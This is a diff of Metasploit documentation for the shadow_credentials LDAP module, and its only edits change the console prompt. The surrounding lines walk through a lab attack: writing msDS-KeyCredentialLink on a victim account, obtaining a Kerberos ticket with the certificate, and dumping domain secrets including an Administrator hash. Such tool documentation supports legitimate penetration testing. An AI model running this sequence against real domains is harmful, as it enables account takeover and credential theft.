@@ -103,7 +103,7 @@ The certificate ID to delete when using the `REMOVE` action. You can retrieve Ce
 In the following example the user `MSF\sandy` has write access to the user account `victim`. We will start the attack using the `admin/ldap/shadow_credentials` module.
 
 ```msf
-msf6 auxiliary(admin/ldap/shadow_credentials) > show options
+msf auxiliary(admin/ldap/shadow_credentials) > show options
 
 Module options (auxiliary/admin/ldap/shadow_credentials):
 
@@ -148,19 +148,19 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/ldap/shadow_credentials) > set rhosts 20.92.148.129
+msf auxiliary(admin/ldap/shadow_credentials) > set rhosts 20.92.148.129
 rhosts => 20.92.148.129
-msf6 auxiliary(admin/ldap/shadow_credentials) > set ldapdomain MSF.LOCAL
+msf auxiliary(admin/ldap/shadow_credentials) > set ldapdomain MSF.LOCAL
 ldapdomain => MSF.LOCAL
-msf6 auxiliary(admin/ldap/shadow_credentials) > set ldapusername sandy
+msf auxiliary(admin/ldap/shadow_credentials) > set ldapusername sandy
 ldapusername => sandy
-msf6 auxiliary(admin/ldap/shadow_credentials) > set ldappassword Password1!
+msf auxiliary(admin/ldap/shadow_credentials) > set ldappassword Password1!
 ldappassword => Password1!
-msf6 auxiliary(admin/ldap/shadow_credentials) > set target_user victim
+msf auxiliary(admin/ldap/shadow_credentials) > set target_user victim
 target_user => victim
-msf6 auxiliary(admin/ldap/shadow_credentials) > set action add
+msf auxiliary(admin/ldap/shadow_credentials) > set action add
 action => add
-msf6 auxiliary(admin/ldap/shadow_credentials) > run
+msf auxiliary(admin/ldap/shadow_credentials) > run
 [*] Running module against 20.92.148.129
 
 [*] Discovering base DN automatically
@@ -174,15 +174,15 @@ The LDAP property has been successfully updated. Now we can request a TGT using 
 
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > set rhosts 20.92.148.129
+msf auxiliary(admin/kerberos/get_ticket) > set rhosts 20.92.148.129
 rhosts => 20.92.148.129
-msf6 auxiliary(admin/kerberos/get_ticket) > set username victim
+msf auxiliary(admin/kerberos/get_ticket) > set username victim
 username => victim
-msf6 auxiliary(admin/kerberos/get_ticket) > set domain MSF.LOCAL
+msf auxiliary(admin/kerberos/get_ticket) > set domain MSF.LOCAL
 domain => MSF.LOCAL
-msf6 auxiliary(admin/kerberos/get_ticket) > set cert_file /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.ad.cs_300384.pfx
+msf auxiliary(admin/kerberos/get_ticket) > set cert_file /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.ad.cs_300384.pfx
 cert_file => /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.ad.cs_300384.pfx
-msf6 auxiliary(admin/kerberos/get_ticket) > run
+msf auxiliary(admin/kerberos/get_ticket) > run
 [*] Running module against 20.92.148.129
 
 [!] Warning: Provided principal and realm (victim@MSF.LOCAL) do not match entries in certificate:
@@ -195,7 +195,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run
 The saved TGT can be used in a pass-the-ticket style attack. For instance using the `auxiliary/gather/windows_secrets_dump` module:
 
 ```msf
-msf6 auxiliary(gather/windows_secrets_dump) > run smb::auth=kerberos smb::rhostname=dc22 smbuser=victim smbdomain=msf.local rhost=20.92.148.129 domaincontrollerrhost=20.92.148.129
+msf auxiliary(gather/windows_secrets_dump) > run smb::auth=kerberos smb::rhostname=dc22 smbuser=victim smbdomain=msf.local rhost=20.92.148.129 domaincontrollerrhost=20.92.148.129
 [*] Running module against 20.92.148.129
 
 [*] 20.92.148.129:445 - Using cached credential for krbtgt/MSF.LOCAL@MSF.LOCAL victim@MSF.LOCAL
@@ -218,7 +218,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:26f8220ed7f1494c5737bd552e661
 In the following example the user `MSF\DESKTOP-H4VEQQHQ$` targets itself. No special permissions are required for this, as computers have some ability to modify their own value by default.
 
 ```msf
-msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ password=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV action=add
+msf auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ password=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV action=add
 [*] Running module against 20.92.148.129
 
 [+] Successfully bound to the LDAP server!
@@ -233,7 +233,7 @@ msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapuser
 Note, however, that attempting to add a second credential will fail under these circumstances:
 
 ```msf
-msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV action=add
+msf auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV action=add
 [*] Running module against 20.92.148.129
 
 [+] Successfully bound to the LDAP server!
@@ -251,9 +251,9 @@ It is possible to circumvent this by first entirely removing the existing value,
 for any legitimate user relying on the existing value.
 
 ```msf
-msf6 auxiliary(admin/ldap/shadow_credentials) > set action flush
+msf auxiliary(admin/ldap/shadow_credentials) > set action flush
 action => flush
-msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV
+msf auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV
 [*] Running module against 20.92.148.129
 
 [+] Successfully bound to the LDAP server!
@@ -262,9 +262,9 @@ msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapuser
 [+] 20.92.148.129:389 Discovered base DN: DC=msf,DC=local
 [+] Successfully deleted the msDS-KeyCredentialLink attribute.
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/shadow_credentials) > set action add
+msf auxiliary(admin/ldap/shadow_credentials) > set action add
 action => add
-msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV
+msf auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV
 [*] Running module against 20.92.148.129
 
 [+] Successfully bound to the LDAP server!
